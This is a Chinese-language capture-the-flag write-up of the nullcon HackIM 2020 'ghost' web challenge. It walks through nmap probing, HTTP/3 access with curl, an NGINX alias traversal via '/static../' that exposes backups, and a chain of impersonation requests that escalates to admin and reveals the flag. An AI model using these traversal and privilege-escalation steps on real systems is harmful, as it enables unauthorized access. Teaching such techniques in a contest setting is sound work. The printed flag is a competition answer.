# nullcon HackIM - 2020

## Web / 473 - ghost

>Ever had a scary feeling when you are alone that there is something in the room, but you cant see it with your eyes alone?
>
>Don't be scared to probe at - >https://web1.ctf.nullcon.net:8443/
>
>Note: Challenge Is Not Down
>

### solution
by [@FI](https://github.com/92b2f2)

打開網址發現 Connection refused, 雖然看起來很像壞掉不過題目有提示說沒有壞掉，加上題目有提到可以probe，隊友就用nmap掃了一下

```
# nmap -sU web1.ctf.nullcon.net -p 8443
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-08 05:22 UTC
Nmap scan report for web1.ctf.nullcon.net (139.59.34.79)
Host is up (0.041s latency).
PORT     STATE         SERVICE
8443/udp open|filtered pcsync-https
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds

# nmap -sT web1.ctf.nullcon.net -p 8443
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-08 05:23 UTC
Nmap scan report for web1.ctf.nullcon.net (139.59.34.79)
Host is up (0.043s latency).
PORT     STATE  SERVICE
8443/tcp closed https-alt
```
發現開了UDP port，而且接下來的提示又是一張數到3的gif，所以我們就懷疑他是用HTTP/3

花了一些時間找可以連上HTTP/3的工具，一開始想說在docker裡[自己build一個支援HTTP/3的curl](https://github.com/curl/curl/blob/master/docs/HTTP3.md)，不過兩種版本都遇到障礙build不起來

索性後來直接找有沒有別人用好的docker，結果有不只一個，隨便挑了一個來用

```
docker run --rm -it inductor/curl-quic-ngtcp2
```

馬上來連連看

```
# curl --http3 https://web1.ctf.nullcon.net:8443/ 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>How are you here?</title>
 
</head>
<body>


<center><h1>Shit! </h1>
<h3>How on earth did you reach here?</h3>
<h3>We added another layer of security to so we dont get hacked. Can you breach that also?</h3>
<img src="/static/giphy.gif"></img>
</center>

<!-- No need to bruteforce# -->

</body>
</html>
```

果然成功連上了

接下來看到他有一張圖片，所以先去試試看`/static`有沒有directory listing

```
<html>
<head><title>Index of /static/</title></head>
<body>
<h1>Index of /static/</h1><hr><pre><a href="../">../</a>
<a href="giphy.gif">giphy.gif</a>                                          05-Feb-2020 19:18             5801332
</pre><hr></body>
</html>
```
發現有directory listing，而且隊友很快就發現有`/static../`，一個因為設定錯誤導致的 NGINX alias traversal 

```
# curl --http3 https://web1.ctf.nullcon.net:8443/static../
<html>
<head><title>Index of /static../</title></head>
<body>
<h1>Index of /static../</h1><hr><pre><a href="../">../</a>
<a href="backup/">backup/</a>                                            05-Feb-2020 19:18                   -
<a href="html/">html/</a>                                              05-Feb-2020 19:18                   -
<a href="static/">static/</a>                                            05-Feb-2020 19:18                   -
</pre><hr></body>
</html>
```
發現有一個backup資料夾
```
# curl --http3 https://web1.ctf.nullcon.net:8443/static../backup/
<html>
<head><title>Index of /static../backup/</title></head>
<body>
<h1>Index of /static../backup/</h1><hr><pre><a href="../">../</a>
<a href="links.txt">links.txt</a>                                          05-Feb-2020 19:18                 277
<a href="nginx.conf">nginx.conf</a>                                         05-Feb-2020 19:18                1242
</pre><hr></body>
</html>
```
裡面有一個txt
```
# curl --http3 https://web1.ctf.nullcon.net:8443/static../backup/links.txt

To signup
http://localhost/check.php?signup=true&name=asd
To Impersonate a person
http://localhost/check.php?impersonator=asd&impersonatee=check
To umimpersonate a person
http://localhost/check.php?unimpersonate=asd-admin
To get status
http://localhost/check.php?status=asd
```
這個txt告訴我們有`check.php`的存在 以及他的參數用法

馬上先來試試看signup

```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?signup=true&name=87" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
Please become admin, username: 87-admin
```
他叫我們要成為admin

看看他的status

```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?status=87" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
name: 87</br>
impersonating: </br>
role: user</br>
admin name: 87-admin</br>
admin role: admin</br>
Please become admin, username: 87-admin
```
再來他的Impersonate的功能 使用後可以獲得另一個人的身份

來試試看可不可以直接成為admin

```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?impersonator=87&impersonatee=87-admin" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
cannot impersonate admin role
```
果然不行 無法 impersonate role 是 admin 的帳號

試了一下後發現可以讓 admin impersonate 一般 user 使 admin 的 role 變成一般 user
```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?impersonator=87-admin&impersonatee=87" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
You are not admin
```
```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?status=87" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
name: 87</br>
impersonating: 87</br>
role: user</br>
admin name: 87-admin</br>
admin role: user</br>
You are not admin
```
接下來就可以讓一般 user impersonate admin 的帳號
```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?impersonator=87&impersonatee=87-admin" -H "Cookie: PHPSESSID=87"  
<center><h1>Welcome to password less authentication system</h1></center>
You admin role is not admin
```
然後再將 admin 的帳號 unimpersonate 使其恢復 admin 的 role
```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?unimpersonate=87-admin" -H "Cookie: PHPSESSID=87"
```
查看 status

使用者成功 impersonate admin 帳號並獲得 flag
```
# curl --http3 "https://web1.ctf.nullcon.net:8443/check.php?status=87" -H "Cookie: PHPSESSID=87"
<center><h1>Welcome to password less authentication system</h1></center>
name: 87</br>
impersonating: 87-admin</br>
role: user</br>
admin name: 87-admin</br>
admin role: admin</br>
hackim20{We_Never_Thought_it_Was_That_Vulnerable}
```

`hackim20{We_Never_Thought_it_Was_That_Vulnerable}`
